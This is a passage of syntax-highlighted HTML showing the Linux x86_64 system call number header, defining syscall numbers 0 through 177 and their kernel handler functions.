class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This file contains the system call numbers.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note: holes are not allowed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">/* at least 8 syscall per cacheline */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_read               0</span></span><br><span class="line">__SYSCALL(__NR_read, sys_read)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_write              1</span></span><br><span class="line">__SYSCALL(__NR_write, sys_write)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_open               2</span></span><br><span class="line">__SYSCALL(__NR_open, sys_open)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_close              3</span></span><br><span class="line">__SYSCALL(__NR_close, sys_close)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_stat               4</span></span><br><span class="line">__SYSCALL(__NR_stat, sys_newstat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstat              5</span></span><br><span class="line">__SYSCALL(__NR_fstat, sys_newfstat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lstat              6</span></span><br><span class="line">__SYSCALL(__NR_lstat, sys_newlstat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_poll               7</span></span><br><span class="line">__SYSCALL(__NR_poll, sys_poll)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lseek              8</span></span><br><span class="line">__SYSCALL(__NR_lseek, sys_lseek)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mmap               9</span></span><br><span class="line">__SYSCALL(__NR_mmap, sys_mmap)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mprotect               10</span></span><br><span class="line">__SYSCALL(__NR_mprotect, sys_mprotect)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munmap             11</span></span><br><span class="line">__SYSCALL(__NR_munmap, sys_munmap)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_brk                12</span></span><br><span class="line">__SYSCALL(__NR_brk, sys_brk)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigaction           13</span></span><br><span class="line">__SYSCALL(__NR_rt_sigaction, sys_rt_sigaction)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigprocmask         14</span></span><br><span class="line">__SYSCALL(__NR_rt_sigprocmask, sys_rt_sigprocmask)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigreturn           15</span></span><br><span class="line">__SYSCALL(__NR_rt_sigreturn, stub_rt_sigreturn)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioctl              16</span></span><br><span class="line">__SYSCALL(__NR_ioctl, sys_ioctl)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pread64                17</span></span><br><span class="line">__SYSCALL(__NR_pread64, sys_pread64)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pwrite64               18</span></span><br><span class="line">__SYSCALL(__NR_pwrite64, sys_pwrite64)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readv              19</span></span><br><span class="line">__SYSCALL(__NR_readv, sys_readv)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_writev             20</span></span><br><span class="line">__SYSCALL(__NR_writev, sys_writev)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_access             21</span></span><br><span class="line">__SYSCALL(__NR_access, sys_access)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pipe               22</span></span><br><span class="line">__SYSCALL(__NR_pipe, sys_pipe)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_select             23</span></span><br><span class="line">__SYSCALL(__NR_select, sys_select)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_yield            24</span></span><br><span class="line">__SYSCALL(__NR_sched_yield, sys_sched_yield)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mremap             25</span></span><br><span class="line">__SYSCALL(__NR_mremap, sys_mremap)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msync              26</span></span><br><span class="line">__SYSCALL(__NR_msync, sys_msync)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mincore                27</span></span><br><span class="line">__SYSCALL(__NR_mincore, sys_mincore)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_madvise                28</span></span><br><span class="line">__SYSCALL(__NR_madvise, sys_madvise)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmget             29</span></span><br><span class="line">__SYSCALL(__NR_shmget, sys_shmget)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmat              30</span></span><br><span class="line">__SYSCALL(__NR_shmat, sys_shmat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmctl             31</span></span><br><span class="line">__SYSCALL(__NR_shmctl, sys_shmctl)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup                32</span></span><br><span class="line">__SYSCALL(__NR_dup, sys_dup)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup2               33</span></span><br><span class="line">__SYSCALL(__NR_dup2, sys_dup2)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pause              34</span></span><br><span class="line">__SYSCALL(__NR_pause, sys_pause)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_nanosleep              35</span></span><br><span class="line">__SYSCALL(__NR_nanosleep, sys_nanosleep)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getitimer              36</span></span><br><span class="line">__SYSCALL(__NR_getitimer, sys_getitimer)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_alarm              37</span></span><br><span class="line">__SYSCALL(__NR_alarm, sys_alarm)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setitimer              38</span></span><br><span class="line">__SYSCALL(__NR_setitimer, sys_setitimer)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpid             39</span></span><br><span class="line">__SYSCALL(__NR_getpid, sys_getpid)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendfile               40</span></span><br><span class="line">__SYSCALL(__NR_sendfile, sys_sendfile64)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_socket             41</span></span><br><span class="line">__SYSCALL(__NR_socket, sys_socket)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_connect                42</span></span><br><span class="line">__SYSCALL(__NR_connect, sys_connect)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_accept             43</span></span><br><span class="line">__SYSCALL(__NR_accept, sys_accept)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendto             44</span></span><br><span class="line">__SYSCALL(__NR_sendto, sys_sendto)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_recvfrom               45</span></span><br><span class="line">__SYSCALL(__NR_recvfrom, sys_recvfrom)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendmsg                46</span></span><br><span class="line">__SYSCALL(__NR_sendmsg, sys_sendmsg)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_recvmsg                47</span></span><br><span class="line">__SYSCALL(__NR_recvmsg, sys_recvmsg)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shutdown               48</span></span><br><span class="line">__SYSCALL(__NR_shutdown, sys_shutdown)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bind               49</span></span><br><span class="line">__SYSCALL(__NR_bind, sys_bind)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_listen             50</span></span><br><span class="line">__SYSCALL(__NR_listen, sys_listen)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsockname            51</span></span><br><span class="line">__SYSCALL(__NR_getsockname, sys_getsockname)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpeername            52</span></span><br><span class="line">__SYSCALL(__NR_getpeername, sys_getpeername)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_socketpair             53</span></span><br><span class="line">__SYSCALL(__NR_socketpair, sys_socketpair)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setsockopt             54</span></span><br><span class="line">__SYSCALL(__NR_setsockopt, sys_setsockopt)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsockopt             55</span></span><br><span class="line">__SYSCALL(__NR_getsockopt, sys_getsockopt)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clone              56</span></span><br><span class="line">__SYSCALL(__NR_clone, stub_clone)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fork               57</span></span><br><span class="line">__SYSCALL(__NR_fork, stub_fork)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vfork              58</span></span><br><span class="line">__SYSCALL(__NR_vfork, stub_vfork)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execve             59</span></span><br><span class="line">__SYSCALL(__NR_execve, stub_execve)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_exit               60</span></span><br><span class="line">__SYSCALL(__NR_exit, sys_exit)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_wait4              61</span></span><br><span class="line">__SYSCALL(__NR_wait4, sys_wait4)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_kill               62</span></span><br><span class="line">__SYSCALL(__NR_kill, sys_kill)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_uname              63</span></span><br><span class="line">__SYSCALL(__NR_uname, sys_uname)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_semget             64</span></span><br><span class="line">__SYSCALL(__NR_semget, sys_semget)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_semop              65</span></span><br><span class="line">__SYSCALL(__NR_semop, sys_semop)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_semctl             66</span></span><br><span class="line">__SYSCALL(__NR_semctl, sys_semctl)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmdt              67</span></span><br><span class="line">__SYSCALL(__NR_shmdt, sys_shmdt)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msgget             68</span></span><br><span class="line">__SYSCALL(__NR_msgget, sys_msgget)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msgsnd             69</span></span><br><span class="line">__SYSCALL(__NR_msgsnd, sys_msgsnd)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msgrcv             70</span></span><br><span class="line">__SYSCALL(__NR_msgrcv, sys_msgrcv)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msgctl             71</span></span><br><span class="line">__SYSCALL(__NR_msgctl, sys_msgctl)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fcntl              72</span></span><br><span class="line">__SYSCALL(__NR_fcntl, sys_fcntl)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_flock              73</span></span><br><span class="line">__SYSCALL(__NR_flock, sys_flock)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsync              74</span></span><br><span class="line">__SYSCALL(__NR_fsync, sys_fsync)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fdatasync              75</span></span><br><span class="line">__SYSCALL(__NR_fdatasync, sys_fdatasync)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_truncate               76</span></span><br><span class="line">__SYSCALL(__NR_truncate, sys_truncate)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ftruncate              77</span></span><br><span class="line">__SYSCALL(__NR_ftruncate, sys_ftruncate)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getdents               78</span></span><br><span class="line">__SYSCALL(__NR_getdents, sys_getdents)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getcwd             79</span></span><br><span class="line">__SYSCALL(__NR_getcwd, sys_getcwd)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chdir              80</span></span><br><span class="line">__SYSCALL(__NR_chdir, sys_chdir)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchdir             81</span></span><br><span class="line">__SYSCALL(__NR_fchdir, sys_fchdir)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rename             82</span></span><br><span class="line">__SYSCALL(__NR_rename, sys_rename)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mkdir              83</span></span><br><span class="line">__SYSCALL(__NR_mkdir, sys_mkdir)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rmdir              84</span></span><br><span class="line">__SYSCALL(__NR_rmdir, sys_rmdir)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_creat              85</span></span><br><span class="line">__SYSCALL(__NR_creat, sys_creat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_link               86</span></span><br><span class="line">__SYSCALL(__NR_link, sys_link)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_unlink             87</span></span><br><span class="line">__SYSCALL(__NR_unlink, sys_unlink)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_symlink                88</span></span><br><span class="line">__SYSCALL(__NR_symlink, sys_symlink)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readlink               89</span></span><br><span class="line">__SYSCALL(__NR_readlink, sys_readlink)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chmod              90</span></span><br><span class="line">__SYSCALL(__NR_chmod, sys_chmod)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchmod             91</span></span><br><span class="line">__SYSCALL(__NR_fchmod, sys_fchmod)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chown              92</span></span><br><span class="line">__SYSCALL(__NR_chown, sys_chown)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchown             93</span></span><br><span class="line">__SYSCALL(__NR_fchown, sys_fchown)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lchown             94</span></span><br><span class="line">__SYSCALL(__NR_lchown, sys_lchown)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_umask              95</span></span><br><span class="line">__SYSCALL(__NR_umask, sys_umask)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_gettimeofday           96</span></span><br><span class="line">__SYSCALL(__NR_gettimeofday, sys_gettimeofday)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getrlimit              97</span></span><br><span class="line">__SYSCALL(__NR_getrlimit, sys_getrlimit)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getrusage              98</span></span><br><span class="line">__SYSCALL(__NR_getrusage, sys_getrusage)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sysinfo                99</span></span><br><span class="line">__SYSCALL(__NR_sysinfo, sys_sysinfo)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_times              100</span></span><br><span class="line">__SYSCALL(__NR_times, sys_times)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ptrace             101</span></span><br><span class="line">__SYSCALL(__NR_ptrace, sys_ptrace)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getuid             102</span></span><br><span class="line">__SYSCALL(__NR_getuid, sys_getuid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_syslog             103</span></span><br><span class="line">__SYSCALL(__NR_syslog, sys_syslog)</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* at the very end the stuff that never runs during the benchmarks */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getgid             104</span></span><br><span class="line">__SYSCALL(__NR_getgid, sys_getgid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setuid             105</span></span><br><span class="line">__SYSCALL(__NR_setuid, sys_setuid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setgid             106</span></span><br><span class="line">__SYSCALL(__NR_setgid, sys_setgid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_geteuid                107</span></span><br><span class="line">__SYSCALL(__NR_geteuid, sys_geteuid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getegid                108</span></span><br><span class="line">__SYSCALL(__NR_getegid, sys_getegid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setpgid                109</span></span><br><span class="line">__SYSCALL(__NR_setpgid, sys_setpgid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getppid                110</span></span><br><span class="line">__SYSCALL(__NR_getppid, sys_getppid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpgrp                111</span></span><br><span class="line">__SYSCALL(__NR_getpgrp, sys_getpgrp)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setsid             112</span></span><br><span class="line">__SYSCALL(__NR_setsid, sys_setsid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setreuid               113</span></span><br><span class="line">__SYSCALL(__NR_setreuid, sys_setreuid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setregid               114</span></span><br><span class="line">__SYSCALL(__NR_setregid, sys_setregid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getgroups              115</span></span><br><span class="line">__SYSCALL(__NR_getgroups, sys_getgroups)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setgroups              116</span></span><br><span class="line">__SYSCALL(__NR_setgroups, sys_setgroups)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setresuid              117</span></span><br><span class="line">__SYSCALL(__NR_setresuid, sys_setresuid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getresuid              118</span></span><br><span class="line">__SYSCALL(__NR_getresuid, sys_getresuid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setresgid              119</span></span><br><span class="line">__SYSCALL(__NR_setresgid, sys_setresgid)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getresgid              120</span></span><br><span class="line">__SYSCALL(__NR_getresgid, sys_getresgid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpgid                121</span></span><br><span class="line">__SYSCALL(__NR_getpgid, sys_getpgid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setfsuid               122</span></span><br><span class="line">__SYSCALL(__NR_setfsuid, sys_setfsuid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setfsgid               123</span></span><br><span class="line">__SYSCALL(__NR_setfsgid, sys_setfsgid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsid             124</span></span><br><span class="line">__SYSCALL(__NR_getsid, sys_getsid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_capget             125</span></span><br><span class="line">__SYSCALL(__NR_capget, sys_capget)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_capset             126</span></span><br><span class="line">__SYSCALL(__NR_capset, sys_capset)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigpending          127</span></span><br><span class="line">__SYSCALL(__NR_rt_sigpending, sys_rt_sigpending)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigtimedwait            128</span></span><br><span class="line">__SYSCALL(__NR_rt_sigtimedwait, sys_rt_sigtimedwait)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigqueueinfo            129</span></span><br><span class="line">__SYSCALL(__NR_rt_sigqueueinfo, sys_rt_sigqueueinfo)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigsuspend          130</span></span><br><span class="line">__SYSCALL(__NR_rt_sigsuspend, stub_rt_sigsuspend)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sigaltstack            131</span></span><br><span class="line">__SYSCALL(__NR_sigaltstack, stub_sigaltstack)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_utime              132</span></span><br><span class="line">__SYSCALL(__NR_utime, sys_utime)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mknod              133</span></span><br><span class="line">__SYSCALL(__NR_mknod, sys_mknod)</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* Only needed for a.out */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_uselib             134</span></span><br><span class="line">__SYSCALL(__NR_uselib, sys_ni_syscall)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_personality            135</span></span><br><span class="line">__SYSCALL(__NR_personality, sys_personality)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ustat              136</span></span><br><span class="line">__SYSCALL(__NR_ustat, sys_ustat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_statfs             137</span></span><br><span class="line">__SYSCALL(__NR_statfs, sys_statfs)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstatfs                138</span></span><br><span class="line">__SYSCALL(__NR_fstatfs, sys_fstatfs)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sysfs              139</span></span><br><span class="line">__SYSCALL(__NR_sysfs, sys_sysfs)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpriority            140</span></span><br><span class="line">__SYSCALL(__NR_getpriority, sys_getpriority)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setpriority            141</span></span><br><span class="line">__SYSCALL(__NR_setpriority, sys_setpriority)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_setparam         142</span></span><br><span class="line">__SYSCALL(__NR_sched_setparam, sys_sched_setparam)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_getparam         143</span></span><br><span class="line">__SYSCALL(__NR_sched_getparam, sys_sched_getparam)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_setscheduler         144</span></span><br><span class="line">__SYSCALL(__NR_sched_setscheduler, sys_sched_setscheduler)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_getscheduler         145</span></span><br><span class="line">__SYSCALL(__NR_sched_getscheduler, sys_sched_getscheduler)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_get_priority_max     146</span></span><br><span class="line">__SYSCALL(__NR_sched_get_priority_max, sys_sched_get_priority_max)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_get_priority_min     147</span></span><br><span class="line">__SYSCALL(__NR_sched_get_priority_min, sys_sched_get_priority_min)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_rr_get_interval      148</span></span><br><span class="line">__SYSCALL(__NR_sched_rr_get_interval, sys_sched_rr_get_interval)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mlock              149</span></span><br><span class="line">__SYSCALL(__NR_mlock, sys_mlock)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munlock                150</span></span><br><span class="line">__SYSCALL(__NR_munlock, sys_munlock)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mlockall               151</span></span><br><span class="line">__SYSCALL(__NR_mlockall, sys_mlockall)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munlockall             152</span></span><br><span class="line">__SYSCALL(__NR_munlockall, sys_munlockall)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vhangup                153</span></span><br><span class="line">__SYSCALL(__NR_vhangup, sys_vhangup)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_modify_ldt             154</span></span><br><span class="line">__SYSCALL(__NR_modify_ldt, sys_modify_ldt)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pivot_root             155</span></span><br><span class="line">__SYSCALL(__NR_pivot_root, sys_pivot_root)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR__sysctl                156</span></span><br><span class="line">__SYSCALL(__NR__sysctl, sys_sysctl)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_prctl              157</span></span><br><span class="line">__SYSCALL(__NR_prctl, sys_prctl)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_arch_prctl             158</span></span><br><span class="line">__SYSCALL(__NR_arch_prctl, sys_arch_prctl)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_adjtimex               159</span></span><br><span class="line">__SYSCALL(__NR_adjtimex, sys_adjtimex)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setrlimit              160</span></span><br><span class="line">__SYSCALL(__NR_setrlimit, sys_setrlimit)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chroot             161</span></span><br><span class="line">__SYSCALL(__NR_chroot, sys_chroot)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sync               162</span></span><br><span class="line">__SYSCALL(__NR_sync, sys_sync)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_acct               163</span></span><br><span class="line">__SYSCALL(__NR_acct, sys_acct)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_settimeofday           164</span></span><br><span class="line">__SYSCALL(__NR_settimeofday, sys_settimeofday)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mount              165</span></span><br><span class="line">__SYSCALL(__NR_mount, sys_mount)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_umount2                166</span></span><br><span class="line">__SYSCALL(__NR_umount2, sys_umount)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_swapon             167</span></span><br><span class="line">__SYSCALL(__NR_swapon, sys_swapon)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_swapoff                168</span></span><br><span class="line">__SYSCALL(__NR_swapoff, sys_swapoff)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_reboot             169</span></span><br><span class="line">__SYSCALL(__NR_reboot, sys_reboot)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sethostname            170</span></span><br><span class="line">__SYSCALL(__NR_sethostname, sys_sethostname)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setdomainname          171</span></span><br><span class="line">__SYSCALL(__NR_setdomainname, sys_setdomainname)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_iopl               172</span></span><br><span class="line">__SYSCALL(__NR_iopl, stub_iopl)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioperm             173</span></span><br><span class="line">__SYSCALL(__NR_ioperm, sys_ioperm)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_create_module          174</span></span><br><span class="line">__SYSCALL(__NR_create_module, sys_ni_syscall)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_init_module            175</span></span><br><span class="line">__SYSCALL(__NR_init_module, sys_init_module)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_delete_module          176</span></span><br><span class="line">__SYSCALL(__NR_delete_module, sys_delete_module)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_kernel_syms            177</span></span><br><span 